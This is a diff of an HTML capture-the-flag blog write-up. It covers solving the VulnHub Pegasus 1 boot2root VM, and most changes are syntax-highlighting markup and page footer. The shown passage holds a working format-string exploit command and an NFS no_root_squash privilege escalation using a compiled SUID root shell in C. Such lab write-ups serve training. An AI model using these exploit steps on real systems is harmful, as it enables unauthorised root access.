-<span style="color:#0f0"># run the exploit...</span>
-mike@pegasus:~$ printf <span style="color:#87ceeb">&#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39;</span> | ./my_first
+<span style=color:#75715e># run the exploit...</span>
+mike@pegasus:~$ printf <span style=color:#e6db74>&#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39;</span> | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> Calculator
+<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> String replay
+<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> String reverse
+<span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> Exit
 
 Selection:
 Enter first number: Enter second number: Error details: ����
 
-                     <span style="color:#f60">10</span>
-Segmentation fault (core dumped)
+                     <span style=color:#ae81ff>10</span>
+Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
 
-<span style="color:#0f0"># ... and check /tmp</span>
+<span style=color:#75715e># ... and check /tmp</span>
 mike@pegasus:~$ ls -lah /tmp/
 total 108K
-drwxrwxrwt  <span style="color:#f60">2</span> root root 4.0K Dec <span style="color:#f60">23</span> 23:17 .
-drwxr-xr-x <span style="color:#f60">22</span> root root 4.0K Nov <span style="color:#f60">19</span> 02:58 ..
--rwsrwxrwx  <span style="color:#f60">1</span> john mike  98K Dec <span style="color:#f60">23</span> 23:17 tojohn
+drwxrwxrwt  <span style=color:#ae81ff>2</span> root root 4.0K Dec <span style=color:#ae81ff>23</span> 23:17 .
+drwxr-xr-x <span style=color:#ae81ff>22</span> root root 4.0K Nov <span style=color:#ae81ff>19</span> 02:58 ..
+-rwsrwxrwx  <span style=color:#ae81ff>1</span> john mike  98K Dec <span style=color:#ae81ff>23</span> 23:17 tojohn
 mike@pegasus:~$
 </code></pre></div><p>We have a new file <code>tojohn</code> in <code>/tmp</code> :D</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@pegasus:~$ /tmp/tojohn
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@pegasus:~$ /tmp/tojohn
 $ id
-<span style="color:#eedd82">uid</span>=1001(mike) <span style="color:#eedd82">gid</span>=1001(mike) <span style="color:#eedd82">euid</span>=1000(john) <span style="color:#eedd82">groups</span>=1000(john),1001(mike)
-</code></pre></div><h2 id="hoofing-rooting-pegasus">hoofing (rooting) Pegasus</h2>
+uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span>
+</code></pre></div><h2 id=hoofing-rooting-pegasus>hoofing (rooting) Pegasus</h2>
 <p>I added the public key of the keypair I generated for Pegasus to <code>john</code>&rsquo;s authorized_keys file and proceeded to SSH in as him.</p>
 <p>Quick enumeration showed that <code>mike</code> is allowed to start the nfs daemon via <code>sudo</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john@pegasus:~$ sudo -l
-Matching Defaults entries <span style="color:#f00">for</span> john on this host:
-    env_reset, <span style="color:#eedd82">secure_path</span>=/usr/local/sbin<span style="color:#87ceeb">\:</span>/usr/local/bin<span style="color:#87ceeb">\:</span>/usr/sbin<span style="color:#87ceeb">\:</span>/usr/bin<span style="color:#87ceeb">\:</span>/sbin<span style="color:#87ceeb">\:</span>/bin
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john@pegasus:~$ sudo -l
+Matching Defaults entries <span style=color:#66d9ef>for</span> john on this host:
+    env_reset, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
 
 User john may run the following commands on this host:
-    (root) NOPASSWD: /usr/local/sbin/nfs
+    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/local/sbin/nfs
 john@pegasus:~$ sudo nfs
-Usage: nfs [start|stop]
+Usage: nfs <span style=color:#f92672>[</span>start|stop<span style=color:#f92672>]</span>
 john@pegasus:~$ sudo nfs start
- * Exporting directories <span style="color:#f00">for</span> NFS kernel daemon...                                                                                                                                 [ OK ]
- * Starting NFS kernel daemon                                                                                                                                                     [ OK ]
+ * Exporting directories <span style=color:#66d9ef>for</span> NFS kernel daemon...                                                                                                                                 <span style=color:#f92672>[</span> OK <span style=color:#f92672>]</span>
+ * Starting NFS kernel daemon                                                                                                                                                     <span style=color:#f92672>[</span> OK <span style=color:#f92672>]</span>
 john@pegasus:~$
 </code></pre></div><p>I checked out the <code>/etc/exports</code> file, and noticed the the <code>no_root_squash</code> flag for the <code>/opt/nfs</code> export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)</p>
-<p>So, I mounted the share&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# mkdir nfs
+<p>So, I mounted the share&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# mkdir nfs
 root@kali:~# mount 192.168.56.101:/opt/nfs nfs
-</code></pre></div><p>&hellip; prepped a SUID shell &hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/pegasus/nfs# cat shell.c
-<span style="color:#0f0">#include &lt;stdio.h&gt;</span>
+</code></pre></div><p>&mldr; prepped a SUID shell &mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/pegasus/nfs# cat shell.c
+<span style=color:#75715e>#include &lt;stdio.h&gt;</span>
 
-int main()
-{
-    setuid(0);
-    setgid(0);
-    system(<span style="color:#87ceeb">&#34;/bin/sh&#34;</span>);
-}
+int main<span style=color:#f92672>()</span>
+<span style=color:#f92672>{</span>
+    setuid<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>;
+    setgid<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>;
+    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span>;
+<span style=color:#f92672>}</span>
 root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
-root@kali:~/Desktop/pegasus/nfs# chmod <span style="color:#f60">4777</span> shell
+root@kali:~/Desktop/pegasus/nfs# chmod <span style=color:#ae81ff>4777</span> shell
 root@kali:~/Desktop/pegasus/nfs# ls -lah
 total 20K
-drwxr-xr-x <span style="color:#f60">2</span> root root 4.0K Dec <span style="color:#f60">23</span> 14:39 .
-drwxr-xr-x <span style="color:#f60">3</span> root root 4.0K Dec <span style="color:#f60">23</span> 14:32 ..
--rwsrwxrwx <span style="color:#f60">1</span> root root 5.0K Dec <span style="color:#f60">23</span> 14:39 shell
--rw-r--r-- <span style="color:#f60">1</span> root root   <span style="color:#f60">79</span> Dec <span style="color:#f60">23</span> 14:39 shell.c
-</code></pre></div><p>&hellip; and rooted Pegasus :)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john@pegasus:~$ /opt/nfs/shell
-<span style="color:#0f0"># id</span>
-<span style="color:#eedd82">uid</span>=0(root) <span style="color:#eedd82">gid</span>=0(root) <span style="color:#eedd82">groups</span>=0(root),1000(john)
-</code></pre></div><h2 id="flag-">flag :)</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># cat /root/flag
+drwxr-xr-x <span style=color:#ae81ff>2</span> root root 4.0K Dec <span style=color:#ae81ff>23</span> 14:39 .
+drwxr-xr-x <span style=color:#ae81ff>3</span> root root 4.0K Dec <span style=color:#ae81ff>23</span> 14:32 ..
+-rwsrwxrwx <span style=color:#ae81ff>1</span> root root 5.0K Dec <span style=color:#ae81ff>23</span> 14:39 shell
+-rw-r--r-- <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>79</span> Dec <span style=color:#ae81ff>23</span> 14:39 shell.c
+</code></pre></div><p>&mldr; and rooted Pegasus :)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john@pegasus:~$ /opt/nfs/shell
+<span style=color:#75715e># id</span>
+uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span>
+</code></pre></div><h2 id=flag->flag :)</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text># cat /root/flag
                ,
                |`\
               /&#39;_/_
@@ -901,186 +768,38 @@ and leave some feedback, I would love to hear from you!
 
 Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
 more awesome boot2root VMs!
-</code></pre></div><p>Thanks for the fun <a href="https://twitter.com/theknapsy">@TheKnapsy</a></p>
-    </div>
-  </article>
-
-  
-  
-
-
-
-
-  
-    <div class="blog-post-comments">
-        <div id="disqus_thread">
-          <script type="text/javascript">
-          
-          (function() {
-              
-              
-              
-              
-          
-              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-              var disqus_shortname = 'slashnote';
-              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-          })();
-          </script>
-          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        </div>
-    </div>
-
-  
-
-
-  <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-          <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-          <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#introduction">introduction</a></li>
-    <li><a href="#nmap-again">nmap, again</a></li>
-    <li><a href="#stomping-some-hoofs-with-pegasus">stomping some hoofs with pegasus</a></li>
-    <li><a href="#pwning-mike">pwning mike</a></li>
-    <li><a href="#my_first-your_first-we_all_first">my_first, your_first, we_all_first</a>
-      <ul>
-        <li><a href="#rebuilding-mainc">rebuilding main.c</a></li>
-        <li><a href="#the-calculator-with-a-hole">the calculator with a hole</a></li>
-        <li><a href="#punching-more-than-numbers">punching more than numbers</a>
-          <ul>
-            <li><a href="#compiling-the-format-string">compiling the format string</a></li>
-            <li><a href="#finishing-the-exploit">finishing the exploit</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-    <li><a href="#hoofing-rooting-pegasus">hoofing (rooting) Pegasus</a></li>
-    <li><a href="#flag-">flag :)</a></li>
-  </ul>
-</nav>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f" aria-label="Facebook">
-      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&text=hoof%20to%20root%20solving%20pegasus%201" aria-label="Twitter">
-      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&title=hoof%20to%20root%20solving%20pegasus%201" aria-label="Linkedin">
-      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&is_video=false&description=hoof%20to%20root%20solving%20pegasus%201" aria-label="Pinterest">
-      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=hoof%20to%20root%20solving%20pegasus%201&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f" aria-label="Email">
-      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&title=hoof%20to%20root%20solving%20pegasus%201" aria-label="Pocket">
-      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&title=hoof%20to%20root%20solving%20pegasus%201" aria-label="reddit">
-      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&name=hoof%20to%20root%20solving%20pegasus%201&description=%3ch2%20id%3d%22introduction%22%3eintroduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fpegasus-1%2c109%2f%22%3ePegasus%201%3c%2fa%3e%20is%20a%20boot2root%20hosted%20on%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2f%22%3eVulnHub%3c%2fa%3e%20built%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2ftheknapsy%22%3e%40TheKnapsy%3c%2fa%3e.%20He%20wrote%20a%20%3ca%20href%3d%22http%3a%2f%2fknapsy.github.io%2fblog%2f2014%2f12%2f16%2fpegasus-has-arrived-my-first-boot2root-vm%2f%22%3eblogpost%3c%2fa%3e%20about%20it%20too%20containing%20a%20small%20introduction%20with%20Pegasus%20as%20his%20first%20boot2root%20%28hoof2root%3f%20%3bp%29.%3c%2fp%3e%0a%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fpegasus_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eHaving%20recently%20played%20in%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f06%2fplaying-in-the-playground-a-offsec-virtual-pentesting-labs-review%2f%22%3eOffsec%20Playground%3c%2fa%3e%20a%20little%20after%20having%20completed%20my%20OSCP%2c%20I%20was%20relatively%20exhausted.%20Pegasus%20had%20its%20fair%20share%20of%20frustrations%20and%20had%20me%20digging%20around%20quite%20a%20bit.%20I%20did%20however%20learn%20a%20very%20valuable%20lesson%26hellip%3b%20%3cem%3eagain%3c%2fem%3e.%20You%20will%20see%20this%20in%20the%20%3cstrong%3emy_first%3c%2fstrong%3e%20section.%3c%2fp%3e%0a%3cp%3eLike%20many%20other%20write%20ups%20I%20do%2c%20I%20will%20also%20recommend%20you%20try%20this%20one%20first%20before%20you%20read%20on.%20For%20me%2c%20Pegasus%20was%20definitely%20slightly%20more%20difficult%20than%20the%20usual%20VulnHub%20stuff%20you%20would%20see%2c%20but%20part%20of%20that%20may%20just%20as%20well%20be%20due%20to%20fatigue%20and%20that%20year%20end%20holiday%20mode%20%3bp.%20However%2c%20that%20should%20not%20discourage%20you%20to%20give%20it%20a%20bash%20anyways%21%3c%2fp%3e%0a%3cp%3eLets%20begin.%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&t=hoof%20to%20root%20solving%20pegasus%201" aria-label="Hacker News">
-      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-      
-        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
-          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
-          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
-          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+</code></pre></div><p>Thanks for the fun <a href=https://twitter.com/theknapsy>@TheKnapsy</a></p>
 </div>
-
-
-  <footer id="footer">
-  <div class="footer-left">
-    Copyright  &copy; 2021  Leon Jacobs 
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </nav>
-  </div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://leonjza.github.io/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-app-reversing-and-smali-patching/>
+<span class=button__icon>←</span>
+<span class=button__text>no more jailbreak detection an adventure into Android app reversing and smali patching</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/>
+<span class=button__text>playing in the playground a offsec virtual pentesting labs review</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</div>
 </footer>
-
-
-  </div>
+<script src=https://leonjza.github.io/assets/main.js></script>
+<script src=https://leonjza.github.io/assets/prism.js></script>
+</div>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
 </body>
-
-<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
-<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
-<script src=https://leonjza.github.io/js/main.js></script>
-<script src=https://leonjza.github.io/js/code-copy.js></script>
-
-
-
 </html>
